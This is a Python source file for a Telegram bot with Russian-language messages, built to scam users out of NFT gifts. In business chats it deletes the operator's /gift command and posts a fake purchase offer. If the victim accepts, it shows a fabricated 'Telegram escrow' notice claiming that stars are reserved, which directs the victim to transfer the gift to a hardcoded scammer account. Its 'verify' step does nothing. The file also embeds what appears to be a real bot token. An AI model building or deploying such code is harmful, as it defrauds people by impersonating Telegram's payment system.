import os
import re
import json
import time
import threading
import requests
import telebot
from flask import Flask
from telebot.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InlineQueryResultArticle,
    InputTextMessageContent,
    ReplyKeyboardMarkup,
    KeyboardButton,
)

# ─────────────────────── НАСТРОЙКИ ───────────────────────

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8204031823:AAHA7mUlrZGVcMlF8whWAqYakjvdTdJ02Bo")
OWNER_ID = 861423393
VERIFY_TIMEOUT_SECONDS = 300
DB_FILE = "users_db.json"

# ─────────────────────── ПРЕМИУМ-ЭМОДЗИ ───────────────────────

EMOJI_GIFT = '<tg-emoji emoji-id="5456140674028019486">🎁</tg-emoji>'
EMOJI_STAR = '<tg-emoji emoji-id="5874948844935974490">⭐️</tg-emoji>'
EMOJI_LOCK = '<tg-emoji emoji-id="5807868868886009920">🔒</tg-emoji>'

# ─────────────────────── БАЗА ДАННЫХ (JSON) ───────────────────────

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_db(data):
    try:
        with open(DB_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
    except Exception as e:
        print(f"[DB ERROR] {e}")

users_db = load_db()

def get_user_settings(user_id):
    uid = str(user_id)
    if uid not in users_db:
        users_db[uid] = {
            "target_url": "tg://send_gift?to=heiseysex",
            "target_nickname": "@HeiseySex",
            "escrow_template": (
                f"{EMOJI_LOCK} Пользователь зарезервировал <b>{{amount}}</b> {EMOJI_STAR} через "
                "эксроу-систему Telegram. Средства хранятся на специальном "
                "эксроу-счёте и будут автоматически зачислены на ваш баланс "
                "звёзд сразу после передачи подарка.\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "<b>Инструкция для завершения сделки:</b>\n\n"
                "1. Передайте подарок пользователю: <a href=\"{gift_url}\"><b>{nickname}</b></a>\n"
                "2. Нажмите «Передать NFT» и выберите <a href=\"{url}\">{name}</a>\n"
                "3. Подтвердите передачу подарка.\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "Telegram зафиксирует транзакцию и моментально зачислит "
                "<b>{amount}</b> {star} на ваш баланс."
            ).replace("{star}", EMOJI_STAR)
        }
        save_db(users_db)
    return users_db[uid]

# ─────────────────────── ИНИЦИАЛИЗАЦИЯ ───────────────────────

bot = telebot.TeleBot(BOT_TOKEN)
offers = {}
offers_lock = threading.Lock()
user_states = {}

# ─────────────────────── УТИЛИТЫ ───────────────────────

def normalize_url(raw):
    raw = raw.strip().strip('"').strip("'")
    if not raw: return ""
    if raw.startswith("@"): return f"https://t.me/{raw[1:]}"
    if raw.startswith(("http://", "https://", "tg://")): return raw
    if raw.startswith(("t.me/", "telegram.me/")): return f"https://{raw}"
    return f"https://t.me/{raw.lstrip('/')}"

def parse_gift_command(text):
    body = text.replace("/gift", "", 1).strip()
    if not body: return None
    quoted = re.findall(r'"([^"]*)"', body)
    without_quotes = re.sub(r'"[^"]*"', "", body).strip()
    if len(quoted) >= 2:
        name = quoted[0]
        url = normalize_url(quoted[1])
        amount_part = without_quotes.split()[0] if without_quotes else ""
    elif len(quoted) == 1:
        name = quoted[0]
        rest = without_quotes.split()
        url = normalize_url(rest[0]) if rest else None
        amount_part = rest[1] if len(rest) >= 2 else ""
    else:
        parts = body.split()
        if len(parts) < 3: return None
        name = parts[0]
        url = normalize_url(parts[1])
        amount_part = parts[2]
    amount = re.sub(r"\D", "", amount_part) if amount_part else ""
    if not url or not amount: return None
    return name, url, amount

def parse_inline_query(raw):
    parts = [p.strip() for p in re.split(r"[|,]", raw or "") if p.strip()]
    if len(parts) == 1:
        text = raw.strip()
        url_match = re.search(r'(https?://\S+|t\.me/\S+|@\w+)', text)
        if url_match:
            url_raw = url_match.group(1)
            name = text[:url_match.start()].strip()
            amount_raw = text[url_match.end():].strip()
        else:
            words = text.split()
            if len(words) >= 3:
                name = " ".join(words[:-2])
                url_raw = words[-2]
                amount_raw = words[-1]
            else:
                name, url_raw, amount_raw = text, "", ""
    else:
        name = parts[0]
        url_raw = parts[1] if len(parts) > 1 else ""
        amount_raw = parts[2] if len(parts) > 2 else ""
    amount = re.sub(r"\D", "", amount_raw)
    url = normalize_url(url_raw) if url_raw else ""
    return name, url, amount

# ─────────────────────── ТЕКСТЫ ───────────────────────

def build_offer_message(name, url, amount):
    return (
        f"{EMOJI_GIFT} Вам поступило предложение о покупке подарка.\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Пользователь предлагает вам <b>{amount}</b> {EMOJI_STAR} за подарок "
        f"<a href=\"{url}\">{name}</a>.\n\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )

def build_offer_keyboard():
    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton("Принять", callback_data="stage_accept"),
        InlineKeyboardButton("Отклонить", callback_data="stage_decline"),
    )
    return keyboard

def build_escrow_message(user_id, name, url, amount):
    settings = get_user_settings(user_id)
    template = settings.get("escrow_template")
    return template.format(
        gift_url=settings.get("target_url"),
        nickname=settings.get("target_nickname"),
        name=name,
        url=url,
        amount=amount
    )

def build_escrow_keyboard(user_id):
    settings = get_user_settings(user_id)
    keyboard = InlineKeyboardMarkup()
    keyboard.row(InlineKeyboardButton("Передать подарок", url=settings.get("target_url")))
    keyboard.row(
        InlineKeyboardButton("Подтвердить", callback_data="stage_verify"),
        InlineKeyboardButton("Отменить", callback_data="stage_decline"),
    )
    return keyboard

# ─────────────────────── ОТПРАВКА ───────────────────────

def try_delete_message(chat_id, message_id, conn_id=None):
    try:
        if conn_id:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
            requests.post(url, json={"chat_id": chat_id, "message_id": message_id, "business_connection_id": conn_id}, timeout=10)
        else:
            bot.delete_message(chat_id, message_id)
    except Exception:
        pass

def safe_edit(chat_id, message_id, text, parse_mode="HTML", reply_markup=None, conn_id=None):
    kwargs = {"chat_id": chat_id, "message_id": message_id, "parse_mode": parse_mode}
    if reply_markup is not None: kwargs["reply_markup"] = reply_markup
    if conn_id: kwargs["business_connection_id"] = conn_id
    try:
        bot.edit_message_text(text, **kwargs)
        return True
    except Exception as e:
        print(f"[EDIT] {message_id}: {e}")
        return False

def send_business_message(chat_id, text, conn_id, reply_markup=None):
    kwargs = {"chat_id": chat_id, "text": text, "parse_mode": "HTML", "business_connection_id": conn_id}
    if reply_markup is not None: kwargs["reply_markup"] = reply_markup
    try:
        return bot.send_message(**kwargs)
    except Exception as e:
        print(f"[SEND] ОШИБКА: {e}")
        return None

# ─────────────────────── МЕНЮ НАСТРОЕК ───────────────────────

@bot.message_handler(commands=['start', 'settings'])
def cmd_start(message):
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.row(KeyboardButton("👤 Изменить ник"), KeyboardButton("🔗 Изменить ссылку"))
    kb.row(KeyboardButton("📝 Изменить текст"))
    bot.send_message(message.chat.id, "<b>Настройки профиля</b>\n\nЗдесь вы можете изменить данные для офферов.", parse_mode="HTML", reply_markup=kb)

@bot.message_handler(func=lambda m: m.text == "👤 Изменить ник")
def set_nick_start(message):
    user_states[message.from_user.id] = "waiting_nick"
    bot.send_message(message.chat.id, "Введите новый юзернейм (например, @MyBestFriend):")

@bot.message_handler(func=lambda m: m.text == "🔗 Изменить ссылку")
def set_url_start(message):
    user_states[message.from_user.id] = "waiting_url"
    bot.send_message(message.chat.id, "Введите новую ссылку для кнопки (например, tg://send_gift?to=myfriend):")

@bot.message_handler(func=lambda m: m.text == "📝 Изменить текст")
def set_text_start(message):
    user_states[message.from_user.id] = "waiting_text"
    bot.send_message(message.chat.id, "Отправьте новый текст инструкции.\nДоступные переменные: <code>{gift_url}</code>, <code>{nickname}</code>, <code>{name}</code>, <code>{url}</code>, <code>{amount}</code>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.from_user.id in user_states, content_types=['text'])
def handle_settings_input(message):
    state = user_states.get(message.from_user.id)
    uid = str(message.from_user.id)
    settings = get_user_settings(message.from_user.id)
    
    if state == "waiting_nick": settings["target_nickname"] = message.text.strip()
    elif state == "waiting_url": settings["target_url"] = message.text.strip()
    elif state == "waiting_text": settings["escrow_template"] = message.text
    
    users_db[uid] = settings
    save_db(users_db)
    del user_states[message.from_user.id]
    bot.send_message(message.chat.id, "✅ Настройки сохранены!", reply_markup=telebot.types.ReplyKeyboardRemove())

# ─────────────────────── BUSINESS-ОБРАБОТЧИК ───────────────────────

@bot.business_message_handler(func=lambda m: m.text is not None, content_types=["text"])
def handle_business_message(message):
    conn_id = message.business_connection_id
    sender_id = message.from_user.id
    
    if sender_id != OWNER_ID: return
    
    # Если пришла команда /gift — удаляем её моментально
    if message.text.startswith("/gift"):
        try_delete_message(message.chat.id, message.message_id, conn_id)
        
        parsed = parse_gift_command(message.text)
        if not parsed:
            send_business_message(message.chat.id, "❌ Неверный формат команды.", conn_id)
            return

        name, url, amount = parsed
        sent = send_business_message(message.chat.id, build_offer_message(name, url, amount), conn_id, reply_markup=build_offer_keyboard())

        if sent is None: return

        with offers_lock:
            offers[sent.message_id] = {
                "name": name, "url": url, "amount": amount,
                "finished": False, "conn_id": conn_id,
                "chat_id": message.chat.id, "user_id": sender_id
            }

# ─────────────────────── INLINE-РЕЖИМ ───────────────────────

@bot.inline_handler(func=lambda q: True)
def handle_inline_query(query):
    raw = (query.query or "").strip()
    if query.from_user.id != OWNER_ID:
        bot.answer_inline_query(query.id, [InlineQueryResultArticle(id="d", title="Нет доступа", description="", input_message_content=InputTextMessageContent(message_text="Нет доступа"))], cache_time=0)
        return

    name, url, amount = parse_inline_query(raw)
    results = []

    if name and url and amount:
        results.append(
            InlineQueryResultArticle(
                id="offer_ready",
                title=f"🎁 {name} — {amount} ⭐",
                description=f"Отправить оффер",
                input_message_content=InputTextMessageContent(message_text=build_offer_message(name, url, amount), parse_mode="HTML"),
                reply_markup=build_offer_keyboard(),
            )
        )
    else:
        results.append(InlineQueryResultArticle(id="h", title="Формат", description="", input_message_content=InputTextMessageContent(message_text="Формат: @бот Название | ссылка | 100")))

    bot.answer_inline_query(query.id, results, cache_time=0)

# ─────────────────────── КНОПКИ ───────────────────────

@bot.callback_query_handler(func=lambda call: True)
def callback_router(call):
    payload = call.data
    conn_id = getattr(call.message, "business_connection_id", None)
    is_inline = (conn_id is None)
    offer_data = offers.get(call.message.message_id, {})
    target_user_id = offer_data.get("user_id", call.from_user.id)

    if payload == "stage_accept":
        text = call.message.html_text or call.message.text or ""
        m = re.search(r'<a href="([^"]+)">([^<]+)</a>', text)
        url = m.group(1) if m else "https://t.me"
        name = m.group(2) if m else "Подарок"
        m2 = re.search(r'<b>(\d+)</b>\s*', text)
        amount = m2.group(1) if m2 else "0"

        if is_inline:
            bot.answer_callback_query(
                call.id,
                text=(
                    "Вы принимаете предложение.\n\n"
                    "Сейчас вам будет отправлена подробная инструкция по передаче подарка через эксроу-систему Telegram.\n\n"
                    "Пожалуйста, следуйте шагам строго по порядку и не закрывайте чат до завершения сделки."
                ),
                show_alert=True
            )
            try:
                bot.send_message(
                    chat_id=call.message.chat.id,
                    text=build_escrow_message(target_user_id, name, url, amount),
                    parse_mode="HTML",
                    reply_markup=build_escrow_keyboard(target_user_id),
                )
            except Exception as e:
                print(f"Ошибка: {e}")
        else:
            bot.answer_callback_query(
                call.id,
                text=(
                    "Вы принимаете предложение.\n\n"
                    "Сейчас вам будет отправлена подробная инструкция по передаче подарка через эксроу-систему Telegram.\n\n"
                    "Пожалуйста, следуйте шагам строго по порядку и не закрывайте чат до завершения сделки."
                ),
                show_alert=True
            )
            safe_edit(
                call.message.chat.id, call.message.message_id,
                build_escrow_message(target_user_id, name, url, amount),
                reply_markup=build_escrow_keyboard(target_user_id),
                conn_id=conn_id,
            )

    elif payload == "stage_verify":
        bot.answer_callback_query(call.id, text="Проверка запущена.")
        safe_edit(call.message.chat.id, call.message.message_id, "⏳ <b>Проверка...</b>", conn_id=conn_id)

    elif payload == "stage_decline":
        bot.answer_callback_query(call.id, text="Отклонено.")
        if is_inline:
            bot.send_message(call.message.chat.id, "❌ <b>Предложение отклонено.</b>", parse_mode="HTML")
        else:
            safe_edit(call.message.chat.id, call.message.message_id, "❌ <b>Предложение отклонено.</b>", conn_id=conn_id)

# ─────────────────────── ЗАПУСК ───────────────────────

app = Flask(__name__)

@app.route("/")
def index(): return "Bot is running"

def run_bot():
    print("✨ Бот запущен. База данных: users_db.json")
    bot.infinity_polling(
        allowed_updates=["message", "callback_query", "inline_query", "business_connection", "business_message", "edited_business_message", "deleted_business_messages"],
        timeout=30,
    )

if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
